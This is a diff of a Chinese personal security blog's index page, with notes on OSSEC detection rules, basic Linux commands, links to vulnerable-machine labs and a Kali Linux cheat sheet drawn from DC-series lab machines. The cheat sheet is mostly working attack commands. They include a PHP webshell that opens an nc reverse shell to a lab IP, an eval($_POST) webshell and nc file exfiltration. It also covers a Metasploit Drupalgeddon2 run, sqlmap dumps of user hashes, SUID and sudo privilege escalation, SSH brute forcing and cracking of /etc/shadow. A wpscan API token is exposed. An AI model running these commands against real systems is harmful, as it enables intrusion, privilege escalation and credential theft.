+<li>检测到未在 Active Directory 中授权的服务（level 12）</li>
+</ol>
+<h2 id="ipsec"><a href="#ipsec" class="headerlink" title="ipsec"></a>ipsec</h2><h3 id="介绍-27"><a href="#介绍-27" class="headerlink" title="介绍"></a>介绍</h3><p>保护IP网络通信的安全协议</p>
+<h3 id="检测行为-29"><a href="#检测行为-29" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>IKE 协商过程中出现的 DoS 攻击（level 8）</li>
+<li>协议协商过程失败（level 8）</li>
+<li>检测到重放数据包（level 8）</li>
+<li>检测到未加密数据包（level 8）</li>
+<li>IPsec Services服务器关闭（level 8）</li>
+</ol>
+<h2 id="named"><a href="#named" class="headerlink" title="named"></a>named</h2><h3 id="介绍-28"><a href="#介绍-28" class="headerlink" title="介绍"></a>介绍</h3><p>DNS（域名系统）服务器软件的一部分，通常指的是 BIND（Berkeley Internet Name Domain）中的命名守护进程。</p>
+<h3 id="检测行为-30"><a href="#检测行为-30" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>发现源端口为0的包（level 12）</li>
+<li>拒绝区域发送传送请求（level 9）</li>
+<li>发生严重错误，服务器关闭（level 12）</li>
+<li>多次错误DNS查询请求（level 10）</li>
+</ol>
+<h2 id="dhcpd"><a href="#dhcpd" class="headerlink" title="dhcpd"></a>dhcpd</h2><h3 id="检测行为-31"><a href="#检测行为-31" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>没有可用DNS（level 7）</li>
+</ol>
+<h2 id="unbound"><a href="#unbound" class="headerlink" title="unbound"></a>unbound</h2><h3 id="介绍-29"><a href="#介绍-29" class="headerlink" title="介绍"></a>介绍</h3><p>开源的、具有高性能和安全性的递归 DNS 解析器。它主要用于将 DNS 查询从客户端发往权威 DNS 服务器，并返回相应的解析结果。</p>
+<h3 id="检测行为-32"><a href="#检测行为-32" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>检测到可疑url请求（level 7）</li>
+</ol>
+<h2 id="arpwatch"><a href="#arpwatch" class="headerlink" title="arpwatch"></a>arpwatch</h2><h3 id="介绍-30"><a href="#介绍-30" class="headerlink" title="介绍"></a>介绍</h3><p>检测和记录网络中设备的 IP 地址与 MAC 地址的映射关系</p>
+<h3 id="检测行为-33"><a href="#检测行为-33" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>IP与MAC频繁转换（level 9）</li>
+<li>MAC地址频繁变化（level 9）</li>
+</ol>
+<h1 id="other"><a href="#other" class="headerlink" title="other"></a>other</h1><h2 id="usb"><a href="#usb" class="headerlink" title="usb"></a>usb</h2><h3 id="检测行为-34"><a href="#检测行为-34" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>发现新的USB设备（level 8）</li>
+</ol>
+<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h3 id="检测行为-35"><a href="#检测行为-35" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>拒绝用户登陆成功（level 9）</li>
+<li>服务器关闭（level 12）</li>
+<li>数据库严重错误消息（level 12）</li>
+<li>多条错误消息（level 10）</li>
+</ol>
+<h2 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog</h2><h3 id="检测行为-36"><a href="#检测行为-36" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>日志长度太大（level 13）</li>
+<li>xinetd（管理和控制网络服务的守护进程）服务连接过多（level 10）</li>
+<li>登陆失败（level 10）</li>
+<li>无效root用户登陆（level 9）</li>
+<li>连接无效端口尝试（level 10）</li>
+<li>收到的包尺寸过大（level 9）</li>
+<li>添加新用户，组（level 8）</li>
+<li>尝试sudo失败3次（level 10）</li>
+<li>SCSI 存储系统磁盘故障、RAID 阵列中的驱动器失败和 RAID 陣列的降级状态。(level 12)</li>
+</ol>
+<h2 id="vmware"><a href="#vmware" class="headerlink" title="vmware"></a>vmware</h2><h3 id="检测行为-37"><a href="#检测行为-37" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>多个虚拟机警告信息，错误信息，多次用户认证失败信息（level 10）</li>
+<li>虚拟机服务器停止。（level 8）</li>
+</ol>
+<h2 id="cisco-ios"><a href="#cisco-ios" class="headerlink" title="cisco_ios"></a>cisco_ios</h2><h3 id="介绍-31"><a href="#介绍-31" class="headerlink" title="介绍"></a>介绍</h3><p>思科（Cisco）公司开发的操作系统</p>
+<h3 id="检测行为-38"><a href="#检测行为-38" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>失败登陆（level 9）</li>
+<li>操作系统自定义紧急事件（level 9）</li>
+<li>阅读开源ossec源码(HIDS，c语言编写)，深刻理解ossec核心功能，使用C++重构代码。<br>使用Adapter，mediator，singleton，strategy，facade，factory等10余种设计模式设计类图，实现rootkit检测，文件完整性检测，日志分析核心功能。<br>使用Iterator，composite，builder，decorator设计模式重新设计规则匹配核心算法，实现多孩子规则树核心数据结构，规则匹配核心算法。</li>
+</ol>
+<h2 id="attacks"><a href="#attacks" class="headerlink" title="attacks"></a>attacks</h2><h3 id="介绍-32"><a href="#介绍-32" class="headerlink" title="介绍"></a>介绍</h3><p>针对所有日志</p>
+<h3 id="检测行为-39"><a href="#检测行为-39" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>无效用户成功登陆（level 12）</li>
+<li>rpc.statd 中的漏洞利用，发送缓冲区溢出（level 14）（rpc.statd 是一个在 Unix 和类 Unix 系统上运行的服务，用于提供网络文件系统（NFS）的状态管理。）</li>
+<li>FTPD缓冲区溢出。（level 14）（WU-FTPD 是一个流行的 FTP 服务器，早期版本（版本 2.6 之前）存在已知的缓冲区溢出漏洞，攻击者可以通过发送特制的请求来触发漏洞。）</li>
+<li>@，？字符多次出现，缓冲区溢出攻击尝试（level 13）</li>
+<li>缓冲区溢出攻击，null用户改变某些信息（level 12）</li>
+<li>相同ip多次失败登陆后成功登陆（level 12）</li>
+<li>检测到多个病毒（level 12）</li>
+</ol>
+<h2 id="asterisk"><a href="#asterisk" class="headerlink" title="asterisk"></a>asterisk</h2><h3 id="介绍-33"><a href="#介绍-33" class="headerlink" title="介绍"></a>介绍</h3><p>开源的 PBX（私人分支交换机）软件平台</p>
+<h3 id="检测行为-40"><a href="#检测行为-40" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>多次无效用户登陆（level 10）</li>
+<li>多次密码错误（level 10）</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2024/08/02/ossec%E8%A7%84%E5%88%99%E6%95%B4%E7%90%86/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-linux-commond" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/07/30/linux-commond/">linux commond</a>
+    </h1>
+  
+
+        
+        <a href="/2024/07/30/linux-commond/" class="archive-article-date">
+  	<time datetime="2024-07-30T08:22:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nat</span><br></pre></td></tr></table></figure>
+<p>n：该参数表示使用数字形式显示地址和端口号，而不进行主机名和服务名称的反向解析。这样做可以提高显示速度，尤其是在有大量连接时。<br>a：该参数表示显示所有的连接状态，包括监听状态的套接字。默认情况下，netstat 只显示活动连接。<br>t：该参数表示仅显示TCP连接。</p>
+<h1 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure>
+<p>a：显示所有用户的进程，而不仅仅是当前用户的进程。通常情况下，如果没有指定 -u 选项，ps 命令只会显示当前用户的进程。使用 a 选项可以显示所有用户的进程。<br>u：以用户为主要的格式显示进程信息。包括USER、PID、%CPU、%MEM、VSZ、RSS、TTY、STAT、START 和 COMMAND 等字段。这个选项用于显示与进程相关的用户信息。<br>x：显示没有控制终端的进程。这些通常是守护进程或者在后台运行的进程，它们不与任何控制终端关联。使用 x 选项可以显示这些进程，即使它们没有控制终端。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2024/07/30/linux-commond/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ossec功能记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/07/26/ossec%E5%8A%9F%E8%83%BD%E8%AE%B0%E5%BD%95/">ossec功能记录</a>
+    </h1>
+  
+
+        
+        <a href="/2024/07/26/ossec%E5%8A%9F%E8%83%BD%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+  	<time datetime="2024-07-26T07:54:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>– &#x2F;var&#x2F;log&#x2F;auth.log<br>– &#x2F;var&#x2F;log&#x2F;syslog<br>– &#x2F;var&#x2F;log&#x2F;dpkg.log</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2024/07/26/ossec%E5%8A%9F%E8%83%BD%E8%AE%B0%E5%BD%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-网址导航" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/07/26/%E7%BD%91%E5%9D%80%E5%AF%BC%E8%88%AA/">网址导航</a>
+    </h1>
+  
+
+        
+        <a href="/2024/07/26/%E7%BD%91%E5%9D%80%E5%AF%BC%E8%88%AA/" class="archive-article-date">
+  	<time datetime="2024-07-26T05:51:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://md5.qqtv5.com/">md5加解密</a><br><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/">Vulhub漏洞靶场</a><br><a target="_blank" rel="noopener" href="https://vulnhub.com/">vulnhub靶机下载</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2024/07/26/%E7%BD%91%E5%9D%80%E5%AF%BC%E8%88%AA/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-kali-linux常用命令" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/07/26/kali-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">kali linux常用命令</a>
+    </h1>
+  
+
+        
+        <a href="/2024/07/26/kali-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="archive-article-date">
+  	<time datetime="2024-07-26T05:21:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a><ul>
+<li><a href="#nmap">nmap</a></li>
+<li><a href="#wetab">wetab</a></li>
+<li><a href="#dirsearch">dirsearch</a></li>
+<li><a href="#searchsploit">searchsploit</a></li>
+</ul>
+</li>
+<li><a href="#web">web</a><ul>
+<li><a href="#wpscan">wpscan</a></li>
+<li><a href="#cewl">cewl</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E5%88%A9%E5%99%A8">攻击利器</a><ul>
+<li><a href="#metasploit">metasploit</a></li>
+<li><a href="#sqlmap">sqlmap</a></li>
+</ul>
+</li>
+<li><a href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">常用命令</a><ul>
+<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a><ul>
+<li><a href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC">一句话木马</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E9%80%81">文件传送</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a><ul>
+<li><a href="#find%E6%8F%90%E6%9D%83">find提权</a></li>
+<li><a href="#git%E6%8F%90%E6%9D%83">git提权</a></li>
+<li><a href="#nmap%E6%8F%90%E6%9D%83">nmap提权</a></li>
+<li><a href="#exim4-489">exim4 4.89</a></li>
+<li><a href="#rbash%E5%8D%87%E7%BA%A7">rbash升级</a></li>
+<li><a href="#sudoers%E6%8F%90%E6%9D%83">sudoers提权</a></li>
+<li><a href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">环境变量</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%AF%86%E7%A0%81">密码</a><ul>
+<li><a href="#hydra">hydra</a></li>
+<li><a href="#john">john</a></li>
+<li><a href="#kali-linux%E8%87%AA%E5%B8%A6%E5%AF%86%E7%A0%81%E6%9C%AC%E8%8E%B7%E5%8F%96">kali linux自带密码本获取</a></li>
+</ul>
+</li>
+<li><a href="#%E5%85%B6%E4%BB%96">其他</a><ul>
+<li><a href="#dos2unix">dos2unix</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24</span><br><span class="line"># -sP: 这个参数告诉 nmap 执行Ping扫描，也就是使用ICMP echo请求来探测目标网络中存活的主机。</span><br><span class="line"></span><br><span class="line">nmap -A -T4 -p- 192.168.193.139</span><br><span class="line"># -A: 这个选项启用操作系统检测、服务版本检测、脚本扫描和Traceroute。</span><br><span class="line"># -T4: 这个选项设置扫描速度，T4表示快速扫描，适合在内网环境中使用，以加快扫描速度而不至于对网络造成太大负担。</span><br><span class="line"># -p-: 这个选项告诉 nmap 扫描目标主机上的所有端口，而不仅仅是一些常见的端口。这种方式称为全端口扫描。</span><br></pre></td></tr></table></figure>
+<h2 id="wetab"><a href="#wetab" class="headerlink" title="wetab"></a>wetab</h2><p>网站类型查找。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://wordy/</span><br></pre></td></tr></table></figure>
+<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://dc-2/ </span><br></pre></td></tr></table></figure>
+<h2 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Drupal</span><br></pre></td></tr></table></figure>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><p>专用于wordpress网站。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 获取帐号</span><br><span class="line">wpscan --url http://wordy --api-token QK4yHoAgn8S2v9r1jdeDYUO2c8XUFvwanM4AVco9nbk -e u</span><br><span class="line"></span><br><span class="line"># 获取登录用户名</span><br><span class="line">wpscan --url http://dc-2 --enumerate u</span><br><span class="line"></span><br><span class="line"># 暴力破解密码</span><br><span class="line">wpscan --url http://dc-2 -U users.txt -P p.txt</span><br></pre></td></tr></table></figure>
+<h2 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 根据网站关键字生成密码本</span><br><span class="line">cewl http://dc-2 -w p.txt</span><br></pre></td></tr></table></figure>
+<h1 id="攻击利器"><a href="#攻击利器" class="headerlink" title="攻击利器"></a>攻击利器</h1><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 打开metasploit</span><br><span class="line">msfconsole   </span><br><span class="line"></span><br><span class="line"># 搜索攻击模块</span><br><span class="line">search Drupalgeddon</span><br><span class="line"></span><br><span class="line"># 选择攻击模块</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line"></span><br><span class="line"># 获取攻击模块缺失的配置选项</span><br><span class="line">show missing</span><br><span class="line"></span><br><span class="line"># 设置攻击主机ip</span><br><span class="line">set RHOSTS 192.168.193.135  </span><br><span class="line"></span><br><span class="line"># 进行渗透攻击</span><br><span class="line">run  </span><br><span class="line"></span><br><span class="line"># 获取反弹shell</span><br><span class="line">shell  </span><br></pre></td></tr></table></figure>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># post方法</span><br><span class="line">sqlmap -u &quot;http://192.168.193.133//results.php&quot; --data=&quot;search=1&quot; --dbs --batch</span><br><span class="line"></span><br><span class="line"># get方法</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot;</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; --dbs</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; -D d7db --tables</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; -D d7db -T users --columns</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; -D d7db -T users -C name,pass --dump </span><br></pre></td></tr></table></figure>
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 直接连接</span><br><span class="line">&lt;?php</span><br><span class="line">system(&quot;nc -e /bin/bash 192.168.193.128 10086&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># 使用蚁剑工具连接</span><br><span class="line">&lt;?php eval(@$_POST[&#x27;shell&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="文件传送"><a href="#文件传送" class="headerlink" title="文件传送"></a>文件传送</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.193.128 10085 &lt; old-passwords.bak</span><br><span class="line">nc -lvvp 10085 &gt; DC-4-P.txt</span><br></pre></td></tr></table></figure>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查找具有s权限命令</span><br><span class="line">find / -perm -u=s -type f -exec ls -la &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"># find有s权限位，可用来root提权</span><br><span class="line">find / -name flag4.txt -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>
+<h3 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+<h3 id="nmap提权"><a href="#nmap提权" class="headerlink" title="nmap提权"></a>nmap提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch root_shell.sh</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; root_shell.sh</span><br><span class="line">sudo nmap --script=root_shell.sh</span><br></pre></td></tr></table></figure>
+<h3 id="exim4-4-89"><a href="#exim4-4-89" class="headerlink" title="exim4 4.89"></a>exim4 4.89</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f -exec ls -la &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">exim4 --version</span><br><span class="line">searchsploit exim</span><br><span class="line">searchsploit -p linux/local/46996.sh</span><br></pre></td></tr></table></figure>
+<h3 id="rbash升级"><a href="#rbash升级" class="headerlink" title="rbash升级"></a>rbash升级</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br></pre></td></tr></table></figure>
+<h3 id="sudoers提权"><a href="#sudoers提权" class="headerlink" title="sudoers提权"></a>sudoers提权</h3><p>升级charles为root用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">charles ALL=(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
+<h1 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h1><h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p>用于暴力破解ssh密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L DC-4-U.txt -P DC-4-P.txt ssh://192.168.193.137 -t 64</span><br></pre></td></tr></table></figure>
+<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 据文件中的密码哈希的格式自动识别，并尝试使用合适的破解方法（如暴力破解、字典攻击等）来找到密码。</span><br><span class="line">john DC-8-P.txt</span><br><span class="line"></span><br><span class="line"># 指定 --format=crypt，你告诉 John 应该使用 crypt 格式的算法来破解 shadow.txt 文件中的密码哈希，用于/etc/shadow。</span><br><span class="line">sudo unshadow /etc/passwd /etc/shadow &gt; passwd.txt</span><br><span class="line">john --format=crypt passwd.txt</span><br></pre></td></tr></table></figure>
+<h2 id="kali-linux自带密码本获取"><a href="#kali-linux自带密码本获取" class="headerlink" title="kali linux自带密码本获取"></a>kali linux自带密码本获取</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zcat /usr/share/wordlists/rockyou.txt.gz | grep k01 &gt; ./DC-6-P.txt</span><br></pre></td></tr></table></figure>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="dos2unix"><a href="#dos2unix" class="headerlink" title="dos2unix"></a>dos2unix</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat -A a.sh </span><br><span class="line"># 每个操作系统以字符表示结尾的时候是不同的，查看脚本文件若每行结尾为 ^M</span><br><span class="line"># 则需要使用命令 转换</span><br><span class="line">dos2unix a.sh </span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">kali linux常用命令</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2024/07/26/kali-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
   
     <article id="post-DC-9靶机攻略" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -698,507 +1571,9 @@
 
 
   
-    <article id="post-DC-4靶机攻略" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/07/22/DC-4%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">DC-4靶机攻略</a>
-    </h1>
-  
-
-        
